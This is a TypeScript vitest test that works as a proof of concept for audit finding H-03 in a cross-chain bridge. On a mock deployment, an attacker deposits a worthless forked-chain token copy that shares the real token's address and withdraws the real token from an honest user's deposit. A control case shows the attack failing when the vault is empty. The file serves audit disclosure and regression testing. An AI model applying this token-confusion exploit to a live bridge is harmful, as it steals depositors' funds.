import { beforeEach, describe, expect, it } from 'vitest'
import { roles } from '../src/accounts.js'
import { fundedDeposit, tokenBalance, withdraw } from '../src/bridge.js'
import { chainA, chainB } from '../src/chains.js'
import { deployFreshBridge, type BridgeDeployment } from '../src/deploy.js'
import { proveDeposit } from '../src/prover/guest.js'
import { fetchWitness } from '../src/prover/host.js'
import { relayBlock } from '../src/relayer.js'

let bridge: BridgeDeployment

beforeEach(async () => {
  bridge = await deployFreshBridge()
})

/**
 * Specification claim: `withdraw` pays `inputs.tokenAddress`, the SOURCE token address, on the
 * destination chain (H-03). The build contract deploys `MockERC20` as the first transaction on
 * both chains, so the mock token sits at the same address on chain A and chain B — modeling how
 * PulseChain copied Ethereum's state. A real-world PulseChain token at that address holds no
 * relationship to the Ethereum token beyond sharing a symbol.
 *
 * Result: an attacker who only ever held the worthless chain B copy deposits it on chain B and
 * withdraws the real chain A token, paid out of an honest user's prior chain A deposit.
 */
describe('H-03: same address, unrelated tokens across a forked chain', () => {
  it('withdraws the real chain A token for a worthless chain B copy', async () => {
    expect(bridge.a.token.toLowerCase()).toBe(bridge.b.token.toLowerCase())

    // An honest user locks the REAL token in chain A's vault, depositing to chain B.
    await fundedDeposit({
      side: bridge.a,
      user: roles.liquidityProvider,
      recipient: roles.liquidityProvider.address,
      amount: 5_000n,
      targetChainId: 369,
    })
    const vaultABalanceBefore = await tokenBalance(bridge.a, bridge.a.token, bridge.a.vault)
    expect(vaultABalanceBefore).toBe(5_000n)

    // The attacker never touched chain A. They only hold the cheap chain B copy that shares
    // the token's address (minted here to stand in for "bought on the open market").
    const attackerCopyAmount = 2_000n
    const depositHash = await fundedDeposit({
      side: bridge.b,
      user: roles.attacker,
      recipient: roles.attacker.address,
      amount: attackerCopyAmount,
      targetChainId: 1,
    })

    const witness = await fetchWitness(chainB.publicClient, depositHash)
    const proof = await proveDeposit(witness, 369)
    expect(proof.inputs.tokenAddress.toLowerCase()).toBe(bridge.a.token.toLowerCase())

    await relayBlock({
      committee: bridge.committeeB,
      blockHash: proof.inputs.confirmedBlockRoot,
      period: 2,
      destination: chainA,
      lightClient: bridge.a.lightClient,
      account: roles.honestRelayer,
    })

    const attackerBalanceOnABefore = await tokenBalance(bridge.a, bridge.a.token, roles.attacker.address)
    await withdraw({ side: bridge.a, caller: roles.attacker, proof })
    const attackerBalanceOnAAfter = await tokenBalance(bridge.a, bridge.a.token, roles.attacker.address)

    // The vault on chain A paid out the real chain A token, funded entirely by the honest
    // user's deposit, in exchange for a deposit of the unrelated chain B copy.
    expect(attackerBalanceOnAAfter - attackerBalanceOnABefore).toBe(attackerCopyAmount)
    const vaultABalanceAfter = await tokenBalance(bridge.a, bridge.a.token, bridge.a.vault)
    expect(vaultABalanceAfter).toBe(vaultABalanceBefore - attackerCopyAmount)

    // Control: without a prior chain A deposit providing liquidity, the vault holds nothing and
    // the same attack reverts (H-09's missing liquidity model, exercised here as the control).
    const freshBridge = await deployFreshBridge()
    await fundedDeposit({
      side: freshBridge.b,
      user: roles.attacker,
      recipient: roles.attacker.address,
      amount: attackerCopyAmount,
      targetChainId: 1,
    })
    const controlHash = await fundedDeposit({
      side: freshBridge.b,
      user: roles.attacker,
      recipient: roles.attacker.address,
      amount: attackerCopyAmount,
      targetChainId: 1,
    })
    const controlWitness = await fetchWitness(chainB.publicClient, controlHash)
    const controlProof = await proveDeposit(controlWitness, 369)
    await relayBlock({
      committee: freshBridge.committeeB,
      blockHash: controlProof.inputs.confirmedBlockRoot,
      period: 2,
      destination: chainA,
      lightClient: freshBridge.a.lightClient,
      account: roles.honestRelayer,
    })
    await expect(withdraw({ side: freshBridge.a, caller: roles.attacker, proof: controlProof })).rejects.toThrow()
  })
})
